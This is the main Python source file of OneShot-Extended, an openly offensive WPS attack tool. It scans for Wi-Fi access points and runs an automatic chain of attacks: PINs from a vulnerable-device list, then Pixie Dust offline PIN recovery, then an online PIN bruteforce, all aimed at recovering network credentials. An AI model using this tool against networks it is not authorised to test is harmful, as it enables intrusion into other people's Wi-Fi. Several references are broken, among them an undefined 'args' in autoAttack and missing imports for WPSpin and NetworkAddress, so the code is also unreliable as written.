# SOURCE: ose.py
# ============================================================================
#!/usr/bin/env python3

#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import os
import sys

# pylint: disable=wrong-import-position
if sys.version_info < (3, 10):
    sys.exit('Python 3.10 or higher is required to run this script.')

from shutil import which
from pathlib import Path
from src import logger

import src.wifi.android
import src.wifi.scanner
import src.wps.connection
import src.wps.bruteforce
import src.utils
import src.args

def checkRequirements():
    """Verify requirements are met"""

    required_binaries = [
        'pixiewps',
        'wpa_supplicant',
        'iw', 'ip'
    ]
    missing = [b for b in required_binaries if not which(b)]

    if missing:
        src.utils.die(f"Missing required utilities: {', '.join(missing)}")

    if os.getuid() != 0:
        src.utils.die('Run it as root')

def setupDirectories():
    """Create required directories"""

    # We recently changed the PIXIEWPS_DIR and SESSIONS_DIR path
    # Rename older .OSE data dir to .OneShot-Extended, and maintain compatibility
    old_dir = os.path.expanduser('~/.OSE')
    new_dir = os.path.expanduser('~/.OneShot-Extended')

    if os.path.exists(old_dir):
        try:
            os.rename(old_dir, new_dir)
            logger.info('Renamed legacy data directory')
        except OSError as e:
            logger.error(f'Failed to rename data directory: {e}')

    for directory in [src.utils.SESSIONS_DIR, src.utils.PIXIEWPS_DIR]:
        if not os.path.exists(directory):
            os.makedirs(directory)

def setupAndroidWifi(android_network: src.wifi.android.AndroidNetwork, enable: bool = False):
    """Configure Android-specific WiFi settings"""

    if enable:
        android_network.enableWifi()
    else:
        android_network.storeAlwaysScanState()
        android_network.disableWifi()

def setupMediatekWifi(wmt_wifi_device: Path):
    """Initialize MediaTek WiFi dev"""

    if not wmt_wifi_device.is_char_device():
        src.utils.die('Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): '
                     '/dev/wmtWifi does not exist or it is not a character device')

    wmt_wifi_device.chmod(0o644)
    wmt_wifi_device.write_text('1', encoding='utf-8')


def scanForNetworks(interface: str, vuln_list: list[str]) -> tuple[str, dict] | None:
    """Scan, and prompt user to select network"""

    scanner = src.wifi.scanner.WiFiScanner(interface, vuln_list)
    return scanner.promptNetwork()

def autoAttack(interface: str, bssid: str, vuln_list_file: str,
               network_info: dict = None, explicit_pin: str = None) -> bool:
    """Smart auto-attack: vulnerable list PIN → Pixie Dust → online bruteforce.

    When a BSSID is selected (via scan or --bssid) without explicit attack flags
    (-P, -B, -p, -N, --pbc), this function runs the full chain automatically:

      1. Check the BSSID against the 612-entry vulnerable device list (OUI match).
         If matched, try each probable PIN.
      2. If none worked (or no match), run Pixie Dust — send a likely PIN, capture
         the WPS exchange, then use pixiewps to recover the PIN offline.
      3. If Pixie Dust also failed, fall back to online 8-digit PIN bruteforce.

    Returns True on success (credentials obtained), False otherwise.
    """

    generator = src.wps.generator.WPSpin()
    success = False

    # --- Step 1: Vulnerable list ---
    algos = generator._getSuggested(bssid)
    if algos:
        logger.info(f'[Auto] {len(algos)} vulnerable device algorithm(s) matched — trying list PIN(s)…')
        connection = src.wps.connection.Initialize(interface)
        for algo in algos:
            pin = algo.get('pin', '')
            if pin:
                logger.info(f'[Auto] Trying PIN \'{pin}\' ({algo["name"]})')
                success = connection.singleConnection(bssid, pin)
                if success:
                    return True
        logger.warning('[Auto] Vulnerable list PINs did not succeed')
        try:
            connection._cleanup()
        except Exception:
            pass

    # --- Step 2: Pixie Dust (offline) ---
    logger.info('[Auto] Trying Pixie Dust attack…')
    likely_pin = explicit_pin or generator.getLikely(bssid) or '12345670'
    connection = src.wps.connection.Initialize(interface)

    saved_pixie = args.pixie_dust
    args.pixie_dust = True
    success = connection.singleConnection(bssid, likely_pin)
    args.pixie_dust = saved_pixie

    if success:
        return True

    logger.warning('[Auto] Pixie Dust did not recover the PIN')
    try:
        connection._cleanup()
    except Exception:
        pass

    # --- Step 3: Online bruteforce ---
    logger.info('[Auto] Falling back to online bruteforce…')
    bf = src.wps.bruteforce.Initialize(interface)
    bf.smartBruteforce(bssid, None)
    return False


def handleConnection(args):
    """Main connection logic"""

    network_info = {}
    success = False

    # Auto mode = no explicit attack flag given
    auto_mode = not (args.pixie_dust or args.bruteforce or args.pin
                     or args.null_pin or args.pbc)

    if args.bruteforce:
        connection = src.wps.bruteforce.Initialize(args.interface)
    else:
        connection = src.wps.connection.Initialize(args.interface)

    if args.pbc:
        connection.singleConnection(pbc_mode=True)
    else:
        if not args.bssid:
            try:
                with open(args.vuln_list, 'r', encoding='utf-8') as file:
                    vuln_list = file.read().splitlines()
            except FileNotFoundError:
                vuln_list = []

            if not args.loop:
                logger.info('BSSID not specified (--bssid) — scanning for available networks')

            result = scanForNetworks(args.interface, vuln_list)
            if result is None:
                return

            args.bssid, network_info = result

        if args.bssid:
            if not network_info:
                probe_state = src.wifi.scanner.probeWpsState(args.interface, args.bssid)
                if probe_state is None:
                    logger.warning('Target AP was not observed in the scan — out of range or on another channel')
                elif not probe_state['WPS']:
                    logger.warning('Target AP is visible but does NOT advertise WPS. '
                                   'WPS is likely disabled in its firmware; the attempt will probably fail')
                elif probe_state['WPS locked']:
                    logger.warning('Target AP advertises WPS but reports setup locked (temporary lockout)')

            if auto_mode:
                success = autoAttack(
                    args.interface, args.bssid, args.vuln_list,
                    network_info, args.pin
                )
            elif args.bruteforce:
                connection.smartBruteforce(
                    args.bssid,
                    args.pin
                )
            else:
                success = connection.singleConnection(
                    args.bssid,
                    args.pin
                )

            # Save to vulnerable list
            if success and network_info:
                src.utils.addVulnerableAP(network_info, args.vuln_list)

def checkBssid(bssid: str, interface: str = None):
    """Check a router BSSID/MAC against the vulnerable lists and saved data, without running any attack.

    When an interface is provided, the AP is also probed over the air to report its
    actual WPS state (enabled / locked / disabled / not found).
    """

    mac = bssid.replace('-', ':').replace('.', ':').upper()
    clean = mac.replace(':', '')

    if len(clean) != 12 or any(c not in '0123456789ABCDEF' for c in clean):
        logger.error(f'Invalid BSSID/MAC address: {bssid}')
        return

    netaddr = NetworkAddress(mac)
    logger.info(f'Checking {netaddr.STRING} against the vulnerable lists…')

    if interface:
        logger.info(f'Probing {netaddr.STRING} over the air (interface: {interface})…')
        probe_state = src.wifi.scanner.probeWpsState(interface, mac)
        if probe_state is None:
            logger.warning('AP not observed in the scan — out of range, hidden, or on another channel')
        else:
            wps_state = src.wifi.scanner.classifyWpsState(probe_state)
            if wps_state == 'enabled':
                logger.success('Over the air: WPS is ENABLED (version {})'.format(probe_state['WPS version']))
            elif wps_state == 'locked':
                logger.warning('Over the air: WPS is ENABLED but currently LOCKED (temporary lockout)')
            elif wps_state == 'disabled':
                logger.warning('Over the air: WPS is DISABLED on this AP (no WPS IE broadcast). '
                               'WPS-based attacks are not possible while it stays off — '
                               'even a derived/predicted PIN cannot be used')
            else:
                logger.warning('Over the air: WPS state could not be determined')

    # 1) Already processed? A previously saved PIN means this router is already known
    pin_file = f'''{src.utils.PIXIEWPS_DIR}{clean}.run'''
    if os.path.exists(pin_file):
        with open(pin_file, 'r', encoding='utf-8') as file:
            saved_pin = file.readline().strip()
        logger.success(f'Already added: a PIN ({saved_pin}) was previously saved for this router')
    else:
        logger.info('Not previously processed (no saved PIN for this BSSID)')

    # 2) Is this router in the vulnerable devices list? (matched by OUI vendor prefixes)
    generator = WPSpin()
    algos = generator._getSuggested(netaddr.STRING)

    if algos:
        logger.success(f'IN the vulnerable list: {len(algos)} known vulnerable device algorithm(s) match this router:')
        for algo in algos:
            pin_str = algo['pin'] if algo['pin'] else '<empty>'
            logger.info('  - {:<10} {} (probable PIN: {})'.format(algo['id'], algo['name'], pin_str))
        logger.info('Recommended first PIN to try: {}'.format(algos[0]['pin'] or '<empty>'))
    else:
        logger.warning('NOT in the vulnerable list: no known vulnerable device algorithm matches this router OUI')

def main():
    """Main os-e code"""

    args = src.args.parseArgs()

    if args.check:
        checkBssid(args.check, args.interface)
        return

    checkRequirements()
    setupDirectories()

    logger.initializeLogging()

    src.utils.checkRunningProcesses(args.interface)

    if args.kill:
        src.utils.killInterfering()

    while True:
        try:
            android_network = src.wifi.android.AndroidNetwork()

            if args.clear:
                src.utils.clearScreen()

            if src.utils.isAndroid() is True and not args.dont_touch_settings and not args.mtk_wifi:
                setupAndroidWifi(android_network)

            if args.mtk_wifi:
                wmt_wifi_device = Path('/dev/wmtWifi')
                setupMediatekWifi(wmt_wifi_device)

            if src.utils.ifaceCtl(args.interface, action='up'):
                src.utils.die(f'Unable to up interface \'{args.interface}\'')

            handleConnection(args)

            if not args.loop:
                break

            args.bssid = None

        except KeyboardInterrupt:
            if args.loop:
                if input('\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ').lower() == 'y':
                    logger.info('Aborting…')
                    break
                args.bssid = None
            else:
                logger.info('Aborting…')
                break

        finally:
            if src.utils.isAndroid() is True and not args.dont_touch_settings and not args.mtk_wifi:
                setupAndroidWifi(android_network, enable=True)

            if args.iface_down:
                src.utils.ifaceCtl(args.interface, action='down')

            if args.mtk_wifi:
                wmt_wifi_device.write_text('0', encoding='utf-8')

            if args.restore:
                src.utils.restoreProcesses()

if __name__ == '__main__':
    main()

